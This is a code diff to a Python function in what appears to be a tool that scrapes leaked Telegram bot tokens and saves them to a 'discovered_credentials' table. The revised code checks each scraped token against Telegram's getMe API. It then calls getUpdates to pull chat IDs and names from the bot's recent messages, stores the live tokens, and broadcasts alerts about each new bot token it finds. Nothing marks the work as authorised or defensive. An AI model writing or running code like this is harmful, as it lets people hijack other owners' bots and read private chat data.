@@ -22,9 +22,10 @@ def _calculate_hash(token: str) -> str:
 
 async def save_manifest(results, source_name: str, verbose=True):
     """
-    STRICT validation: Only saves if BOTH token is valid AND chat_id can be discovered.
+    Validates token format and checks if bot is active via Telegram API.
+    Saves if token passes format check AND getMe - does NOT require chats.
     """
-    from app.services.scraper_srv import scraper_service
+    import requests
     from app.services.scanners import _is_valid_token
     
     saved_count = 0
@@ -33,62 +34,128 @@ async def save_manifest(results, source_name: str, verbose=True):
         if not token or token == "MANUAL_REVIEW_REQUIRED":
             continue
         
-        # Step 0: Validate token format FIRST
+        # Step 1: Validate token format (reject Fernet/hashes)
         if not _is_valid_token(token):
             if verbose:
                 print(f"  ❌ Invalid token format (Fernet/hash?): {token[:20]}...")
             continue
         
         token_hash = _calculate_hash(token)
+        existing_id = None
+        existing_has_chat = False
         
         try:
-            # Step 1: Check if already exists
-            existing = db.table("discovered_credentials").select("id").eq("token_hash", token_hash).execute()
+            # Step 2: Check if already exists
+            existing = db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash).execute()
             if existing.data:
-                if verbose:
-                    print(f"  ⏭️ Token already exists, skipping.")
-                continue
+                existing_id = existing.data[0]['id']
+                existing_has_chat = existing.data[0].get('chat_id') is not None
+                if existing_has_chat:
+                    if verbose:
+                        print(f"  ⏭️ Token already exists with chat_id, skipping.")
+                    continue
+                else:
+                    if verbose:
+                        print(f"  🔄 Token exists but no chat_id, will update if we find one...")
             
-            # Step 2: STRICT - Validate by discovering chats (REQUIRED)
+            # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
             if verbose:
-                print(f"  🔍 Validating token {token[:15]}... via Telegram API")
-            chats = await scraper_service.discover_chats(token)
+                print(f"  🔍 Validating token {token[:15]}... via Bot API")
             
-            if not chats:
+            base_url = f"https://api.telegram.org/bot{token}"
+            me_res = requests.get(f"{base_url}/getMe", timeout=10)
+            
+            if me_res.status_code != 200 or not me_res.json().get('ok'):
                 if verbose:
-                    print(f"  ❌ No chats found - NOT SAVING (strict mode)")
-                await broadcaster_service.send_log(f"⚠️ [{source_name}] Token found but no chats - not saved.")
+                    print(f"  ❌ Token invalid or revoked")
                 continue
             
-            # Step 3: Token valid AND has chats - save with chat_id
-            first_chat = chats[0]
+            bot_info = me_res.json().get('result', {})
+            bot_username = bot_info.get('username', 'unknown')
+            if verbose:
+                print(f"  ✅ Token valid! Bot: @{bot_username}")
+            
+            # Step 4: Try to get a chat_id from getUpdates (optional - best effort)
+            chat_id = None
+            chat_name = None
+            chat_type = None
+            
+            try:
+                updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 10}, timeout=10)
+                if updates_res.status_code == 200 and updates_res.json().get('ok'):
+                    updates = updates_res.json().get('result', [])
+                    for update in updates:
+                        for key in ['message', 'channel_post', 'my_chat_member']:
+                            if key in update and update[key].get('chat'):
+                                chat = update[key]['chat']
+                                chat_id = chat.get('id')
+                                chat_name = chat.get('title') or chat.get('username') or chat.get('first_name')
+                                chat_type = chat.get('type')
+                                break
+                        if chat_id:
+                            break
+            except:
+                pass
+            
+            # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
             encrypted_token = security.encrypt(token)
             
-            data = {
-                "bot_token": encrypted_token,
-                "token_hash": token_hash,
-                "chat_id": first_chat.get("id"),  # REQUIRED!
-                "source": source_name,
-                "status": "active",  # Already validated!
-                "meta": {
-                    **item.get("meta", {}),
-                    "chat_name": first_chat.get("name"),
-                    "chat_type": first_chat.get("type"),
-                    "total_chats": len(chats)
+            if existing_id and chat_id:
+                # UPDATE existing record with new chat_id
+                update_data = {
+                    "chat_id": chat_id,
+                    "status": "active",
+                    "meta": {
+                        **item.get("meta", {}),
+                        "bot_username": bot_username,
+                        "bot_id": bot_info.get('id'),
+                        "chat_name": chat_name,
+                        "chat_type": chat_type
+                    }
                 }
-            }
-            
-            res = db.table("discovered_credentials").insert(data).execute()
-            
-            if res.data:
+                db.table("discovered_credentials").update(update_data).eq("id", existing_id).execute()
                 if verbose:
-                    print(f"  🎯 [NEW] Verified Credential ID: {res.data[0]['id']}")
+                    print(f"  🔄 [UPDATED] Credential ID: {existing_id} - now has chat_id!")
                 await broadcaster_service.send_log(
-                    f"🎯 [{source_name}] **Verified Credential!**\n"
-                    f"ID: `{res.data[0]['id']}`\n"
-                    f"Chat: {first_chat.get('name')} ({first_chat.get('type')})"
+                    f"🔄 [{source_name}] **Updated Token!**\n"
+                    f"Bot: @{bot_username}\n"
+                    f"ID: `{existing_id}`\n"
+                    f"Chat: {chat_name} ({chat_type})"
                 )
                 saved_count += 1
+            elif existing_id and not chat_id:
+                # Token exists, still no chat - skip
+                if verbose:
+                    print(f"  ⏭️ Token exists, still no chat_id found, skipping update.")
+            else:
+                # INSERT new record
+                data = {
+                    "bot_token": encrypted_token,
+                    "token_hash": token_hash,
+                    "chat_id": chat_id,
+                    "source": source_name,
+                    "status": "pending" if not chat_id else "active",
+                    "meta": {
+                        **item.get("meta", {}),
+                        "bot_username": bot_username,
+                        "bot_id": bot_info.get('id'),
+                        "chat_name": chat_name,
+                        "chat_type": chat_type
+                    }
+                }
+                
+                res = db.table("discovered_credentials").insert(data).execute()
+                
+                if res.data:
+                    status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING (no chat)"
+                    if verbose:
+                        print(f"  🎯 [NEW] Saved Credential ID: {res.data[0]['id']} - {status_label}")
+                    await broadcaster_service.send_log(
+                        f"🎯 [{source_name}] **New Bot Token!**\n"
+                        f"Bot: @{bot_username}\n"
+                        f"Status: {status_label}"
+                    )
+                    saved_count += 1
                 
         except Exception as e:
             if verbose: print(f"  ❌ Save Error: {e}")
